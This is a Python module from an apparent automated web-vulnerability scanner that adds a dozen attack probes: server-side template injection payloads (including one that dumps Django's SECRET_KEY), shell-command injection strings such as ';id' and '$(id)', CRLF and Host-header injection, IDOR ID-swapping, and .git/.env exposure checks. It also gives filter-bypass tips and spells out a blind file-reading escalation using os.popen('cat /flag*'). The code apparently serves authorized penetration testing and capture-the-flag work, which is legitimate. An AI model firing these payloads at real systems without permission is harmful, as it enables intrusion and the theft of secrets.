"""Extended probe kit — depth layer: 10 more oracle-backed bug classes.

Appended to the original 7: SSTI, command injection, GraphQL introspection,
host-header poisoning, CRLF, IDOR/BOLA (session-aware), rate-limit probing,
.git exposure, .env exposure, backup/sensitive-path sweep.
"""

from __future__ import annotations

import asyncio
import json
import re
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import httpx

from ..recon.paths import discover_paths
from ..scope.guard import ScopeGuard
from .oracle import Evidence, Oracle, OracleVerdict
from .probes import ProbeKit, ProbeOutput

# (payload, markers) — engine canaries. The {% print %} / {% if %} forms
# survive {{ }}-delimiter filters: Jinja statement tags are a separate
# delimiter, so "forbidden characters: {{" only blocks the print-syntax one.
_SSTI_PAYLOADS = (
    ("{{7*7}}", ("49",)),
    ("{{7*'7'}}", ("7777777",)),
    ("${7*7}", ("49",)),
    ("<%= 7*7 %>", ("49",)),
    ("#{7*7}", ("49",)),
    ("*{7*7}", ("49",)),
    ("{% print 7*7 %}", ("49",)),
    ("{% if 7*7 == 49 %}avciyes{% endif %}", ("avciyes",)),
    # engine dialects beyond Jinja (no % / no operators needed): Django has
    # no arithmetic and filters {% %} hard, but |upper and attribute chains
    # still execute. {{ settings }} is the Django fingerprint (dumps
    # SECRET_KEY); ''.__class__ proves object-graph walking for RCE chains.
    ("{{ 'avci'|upper }}", ("AVCI",)),
    ("{{ settings }}", ("SECRET_KEY",)),
    ("{{ ''.__class__ }}", ("<class 'str'>",)),
    # OGNL (Struts2 TextParseUtil/ognl): %{expr} evaluates; static method
    # access makes it RCE. %{7*7} is the canary, toUpperCase the dialect
    # marker — 49/AVCI distinguish OGNL from Jinja on the same input.
    ("%{7*7}", ("49",)),
    ("%{'avci'.toUpperCase()}", ("AVCI",)),
)
_CMD_PAYLOADS = (
    (";id", "uid="), ("|id", "uid="), ("`id`", "uid="), ("$(id)", "uid="),
    ("&id", "uid="), (";whoami", None), ("|| whoami", None),
)


class ExtendedProbeKit(ProbeKit):
    """Subclass adding deep probes; REGISTRY here merges both sets."""

    # ------------------------------------------------------------------
    async def ssti(self, url: str, param: str = "") -> ProbeOutput:
        # paramless URL / bare handler: POST forms are where template
        # injection actually lives (register/profile/notes fields rendered
        # back through the engine)
        if not param:
            out = await self._ssti_form_battery(url)
            if out is not None:
                return out
        parts = urlsplit(url)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        base_t = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), ""))
        base = await self._get(base_t)   # benign baseline — marker must be new
        best = None
        for payload, markers in _SSTI_PAYLOADS:
            q2 = dict(q)
            # REPLACE the value: appending the payload to the old one
            # drags the old bytes through the render too ("abc49" fails
            # numeric validators) — the payload must own the param
            q2[param] = payload
            t = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q2), ""))
            r = await self._get(t)
            rendered = any(m in r.text and m not in base.text for m in markers)
            if rendered:
                v = OracleVerdict(claim="SSTI", verdict="CONFIRMED",
                                  checks=[{"check": "expression evaluated",
                                           "pass": True}],
                                  reason=f"{payload!r} rendered (7*7=49)")
                return ProbeOutput("ssti", t, v, Evidence(
                    request=self._req_repr("GET", t), response_status=r.status_code,
                    response_excerpt=r.text[:400]))
            if best is None:
                best = (t, r.text[:200])
        # a 400 that NAME-CHECKS template syntax is the app admitting it
        # renders templates — surface that as a lead, not a dead end
        why = "no expression evaluated"
        if best and any(w in best[1].lower() for w in
                        ("forbidden", "blocked", "not allowed",
                         "invalid character", "disallowed")):
            why += (" — but the app FILTERS template syntax (why filter what "
                    "it never renders?): swap delimiters ({% print 7*7 %} / "
                    "{% if %} oracles survive {{ }} filters; use |attr('x') "
                    "when . [ ] _ are filtered; numeric-only output = blind "
                    "{% if %} oracle, extract like blind SQLi)")
        failed = OracleVerdict("SSTI", "FAILED", [], why)
        return ProbeOutput("ssti", best[0] if best else url, failed, Evidence())

    # ------------------------------------------------------------------
    async def command_injection(self, url: str, param: str) -> ProbeOutput:
        parts = urlsplit(url)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        best = None
        for payload, marker in _CMD_PAYLOADS:
            q2 = dict(q)
            q2[param] = (q2.get(param) or "") + payload
            t = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q2), ""))
            r = await self._get(t)
            if marker and marker in r.text:
                v = OracleVerdict("Command injection", "CONFIRMED",
                                  [{"check": "command output in body", "pass": True}],
                                  f"{payload!r} → output contains {marker!r}")
                return ProbeOutput("command_injection", t, v, Evidence(
                    request=self._req_repr("GET", t), response_status=r.status_code,
                    response_excerpt=r.text[:400]))
            if best is None:
                best = (t, r.status_code)
        # time-based: whoami-style produced no output — try error oracle
        failed = OracleVerdict("Command injection", "FAILED", [],
                               "no output markers; try time-based manually")
        return ProbeOutput("command_injection", best[0] if best else url,
                           failed, Evidence())

    # ------------------------------------------------------------------
    async def graphql_introspection(self, url: str) -> ProbeOutput:
        self.guard.check_url(url)
        q = {"query": "{__schema{types{name}}}"}
        r = await self._client.post(url, json=q)
        ok = '"types"' in r.text or "__schema" in r.text
        v = OracleVerdict("GraphQL introspection", "CONFIRMED" if ok else "FAILED",
                          [{"check": "__schema in response", "pass": ok}],
                          "introspection enabled — full API map leaks"
                          if ok else "introspection disabled/absent")
        return ProbeOutput("graphql_introspection", url, v, Evidence(
            request=self._req_repr("POST", url) + f"\n{{'query': '{{__schema{{types{{name}}}}}}'}}",
            response_status=r.status_code, response_excerpt=r.text[:400]))

    # ------------------------------------------------------------------
    async def host_header_poisoning(self, url: str) -> ProbeOutput:
        evil = "avci-evil.example"
        r = await self._get(url, headers={"Host": evil})
        reflected = evil in r.text
        links = re.findall(r'https?://avci-evil\.example[^\s"\'<>]*', r.text)
        v = OracleVerdict("Host header poisoning", "CONFIRMED" if reflected else "FAILED",
                          [{"check": "Host reflected into body/links", "pass": reflected}],
                          f"{len(links)} poisoned absolute links" if links else
                          "Host not reflected")
        return ProbeOutput("host_header", url, v, Evidence(
            request=self._req_repr("GET", url, {"Host": evil}),
            response_status=r.status_code,
            response_excerpt=(links[0] if links else r.text[:200])))

    # ------------------------------------------------------------------
    async def crlf(self, url: str, param: str) -> ProbeOutput:
        parts = urlsplit(url)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        q[param] = "avci\r\nX-Avci-Injected: 1"
        t = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), ""))
        # urlencode escapes CR/LF; also try raw append on the path form
        raw = f"{url}&{param}=avci%0d%0aX-Avci-Injected:%201"
        for target in (t, raw):
            r = await self._get(target)
            injected = "x-avci-injected" in {k.lower() for k in r.headers}
            if injected:
                v = OracleVerdict("CRLF injection", "CONFIRMED",
                                  [{"check": "injected header returned", "pass": True}],
                                  "X-Avci-Injected echoed in response headers")
                return ProbeOutput("crlf", target, v, Evidence(
                    request=self._req_repr("GET", target),
                    response_status=r.status_code,
                    response_excerpt="X-Avci-Injected: 1"))
        failed = OracleVerdict("CRLF injection", "FAILED", [],
                               "no header injection observed")
        return ProbeOutput("crlf", t, failed, Evidence())

    # ------------------------------------------------------------------
    async def idor_swap(self, url_template: str, auth_headers: dict | None = None,
                        iterations: int = 4) -> ProbeOutput:
        """url_template contains ONE numeric id: /api/orders/1337/x → probe
        neighbors. Needs an authenticated session's headers to be meaningful."""
        m = re.search(r"/(\d{2,})(?=/|$|\?)", url_template)
        if not m:
            failed = OracleVerdict("IDOR", "FAILED", [],
                                   "no numeric id found in url")
            return ProbeOutput("idor_swap", url_template, failed, Evidence())
        base_id = int(m.group(1))
        probe_ids = [base_id + d for d in (1, -1, 2, 10)][:iterations]

        async def fetch(url: str) -> httpx.Response:
            self.guard.check_url(url)
            return await self._client.get(url, headers=auth_headers or {})

        r0 = await fetch(url_template)
        diffs = []
        for pid in probe_ids:
            candidate = url_template[:m.start(1)] + str(pid) + url_template[m.end(1):]
            r = await fetch(candidate)
            same_status = r.status_code == r0.status_code
            # any byte-level difference on a neighbor id is distinct data —
            # same-length distinct JSON is still an IDOR (lab lesson)
            different_body = r.text != r0.text
            if same_status and r.status_code == 200 and different_body:
                diffs.append((candidate, r.text[:200]))
        if diffs:
            v = OracleVerdict("IDOR/BOLA", "CONFIRMED",
                              [{"check": "neighbor id returns distinct data",
                                "pass": True}],
                              f"{len(diffs)} neighbor ids returned different "
                              "200 payloads with same session")
            return ProbeOutput("idor_swap", diffs[0][0], v, Evidence(
                request=self._req_repr("GET", diffs[0][0], auth_headers),
                response_status=200, response_excerpt=diffs[0][1]))
        v = OracleVerdict("IDOR/BOLA", "PENDING" if r0.status_code == 200 else "FAILED",
                          [{"check": "neighbor ids blocked or identical",
                            "pass": True}],
                          "no distinct neighbor data (either protected or "
                          "needs a second account to prove cross-tenant)")
        return ProbeOutput("idor_swap", url_template, v, Evidence(
            request=self._req_repr("GET", url_template, auth_headers),
            response_status=r0.status_code))

    # ------------------------------------------------------------------
    async def rate_limit(self, url: str, n: int = 25) -> ProbeOutput:
        codes: dict[int, int] = {}
        for _ in range(n):
            r = await self._get(url)
            codes[r.status_code] = codes.get(r.status_code, 0) + 1
        has_429 = 429 in codes
        v = OracleVerdict("Rate limit absent", "CONFIRMED" if not has_429 else "FAILED",
                          [{"check": "no 429 after burst", "pass": not has_429}],
                          f"{n} rapid requests → {codes}")
        return ProbeOutput("rate_limit", url, v, Evidence(
            request=self._req_repr("GET", url) + f" x{n}",
            response_status=429 if has_429 else 200,
            response_excerpt=json.dumps(codes)))

    # ------------------------------------------------------------------
    async def git_exposure(self, origin: str) -> ProbeOutput:
        url = origin.rstrip("/") + "/.git/HEAD"
        r = await self._get(url)
        leak = r.status_code == 200 and "ref: refs/" in r.text
        v = OracleVerdict(".git exposure", "CONFIRMED" if leak else "FAILED",
                          [{"check": "HEAD readable + ref:", "pass": leak}],
                          "repository metadata publicly readable — full source "
                          "recoverable via .git/index" if leak else "not exposed")
        return ProbeOutput("git_exposure", url, v, Evidence(
            request=self._req_repr("GET", url), response_status=r.status_code,
            response_excerpt=r.text[:120]))

    # ------------------------------------------------------------------
    async def env_exposure(self, origin: str) -> ProbeOutput:
        url = origin.rstrip("/") + "/.env"
        r = await self._get(url)
        keys = re.findall(r"^[A-Z_]{3,}=", r.text or "", re.M)
        leak = r.status_code == 200 and len(keys) >= 2
        v = OracleVerdict(".env exposure", "CONFIRMED" if leak else "FAILED",
                          [{"check": "≥2 ENV=assignments", "pass": leak}],
                          f"{len(keys)} variables: {[k[:-1] for k in keys[:8]]}"
                          if leak else "not exposed")
        masked = re.sub(r"=(.{0,3}).*", r"=\1***", r.text or "")
        return ProbeOutput("env_exposure", url, v, Evidence(
            request=self._req_repr("GET", url), response_status=r.status_code,
            response_excerpt=masked[:300]))

    # ------------------------------------------------------------------
    async def sensitive_paths(self, origin: str) -> ProbeOutput:
        hits = await discover_paths(origin, self.guard, self._client)
        sig_hits = [h for h in hits if h.severity in ("critical", "high", "medium")]
        confirmed = bool(sig_hits)
        v = OracleVerdict("Sensitive path exposure",
                          "CONFIRMED" if confirmed else "FAILED",
                          [{"check": "signature-verified sensitive path",
                            "pass": confirmed}],
                          "; ".join(f"{h.title} @ {h.url}" for h in sig_hits[:5])
                          or "no signature hits")
        return ProbeOutput("sensitive_paths", origin, v, Evidence(
            request=f"content-discovery sweep over {origin}",
            response_excerpt="\n".join(
                f"[{h.severity}] {h.url} — {h.title}: {h.excerpt[:80]}"
                for h in hits[:15])))

    # ------------------------------------------------------------------
    async def magic_hash(self, url: str) -> ProbeOutput:
        """PHP loose-== hash comparison: canonical md5/sha1 0e preimages
        against any password/vault form (battery over the page's forms)."""
        out = await self._magic_hash_battery(url)
        return out  # battery returns a real output whenever a form exists

    # ------------------------------------------------------------------
    async def expr_oracle(self, url: str, param: str) -> ProbeOutput:
        """Expression-position injection (blind, count oracle). The payload
        lands where a VALUE is evaluated — f-string into {% for x in
        range(P) %}, chart/PDF row counts — so {{ }} is filtered or absent
        but bare arithmetic evaluates. Oracle: response LENGTH proportional
        to the evaluated number."""
        parts = urlsplit(url)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))

        def with_val(v: str) -> str:
            q2 = dict(q)
            q2[param] = v
            return urlunsplit((parts.scheme, parts.netloc, parts.path,
                               urlencode(q2), ""))

        r3 = await self._get(with_val("3"))
        r7 = await self._get(with_val("7"))
        r_add = await self._get(with_val("2+5"))
        unit = abs(len(r7.text) - len(r3.text))
        if unit < 30:
            failed = OracleVerdict("expression injection", "FAILED", [],
                                   "response size not driven by param value "
                                   "(no count oracle)")
            return ProbeOutput("expr_oracle", with_val("3"), failed, Evidence())
        drift = abs(len(r_add.text) - len(r7.text))
        if drift <= max(8, unit * 0.15):
            v = OracleVerdict(
                "Expression-position injection (blind, count oracle)",
                "CONFIRMED",
                [{"check": "2+5 rendered as 7 (length tracks n=7, not n=3)",
                  "pass": True}],
                "bare arithmetic evaluates — the param sits in EXPRESSION "
                "position (statement/loop interior). Escalate by reading "
                "files THROUGH the count: "
                "len(__import__('os').popen('cat /flag*').read()) gives the "
                "length, then ord(...read()[i]) per character — count rows/"
                "bytes per response; `1 if COND else 2` is a 1/2-row bit "
                "oracle for binary search. No braces or % needed.")
            return ProbeOutput("expr_oracle", with_val("2+5"), v, Evidence(
                request=self._req_repr("GET", with_val("2+5")),
                response_status=r_add.status_code,
                response_excerpt=f"len(3)={len(r3.text)} len(7)={len(r7.text)}"
                                 f" len(2+5)={len(r_add.text)}"))
        failed = OracleVerdict("expression injection", "FAILED", [],
                               "2+5 not evaluated like 7 (or int-cast/400) "
                               "— param not in expression position")
        return ProbeOutput("expr_oracle", with_val("2+5"), failed, Evidence())

    # ------------------------------------------------------------------
    DEEP_REGISTRY = {
        "ssti": ssti,
        "expr_oracle": expr_oracle,
        "magic_hash": magic_hash,
        "command_injection": command_injection,
        "graphql_introspection": graphql_introspection,
        "host_header": host_header_poisoning,
        "crlf": crlf,
        "idor_swap": idor_swap,
        "rate_limit": rate_limit,
        "git_exposure": git_exposure,
        "env_exposure": env_exposure,
        "sensitive_paths": sensitive_paths,
    }

    @classmethod
    def full_registry(cls) -> dict:
        return {**cls.REGISTRY, **{k: v for k, v in cls.DEEP_REGISTRY.items()}}
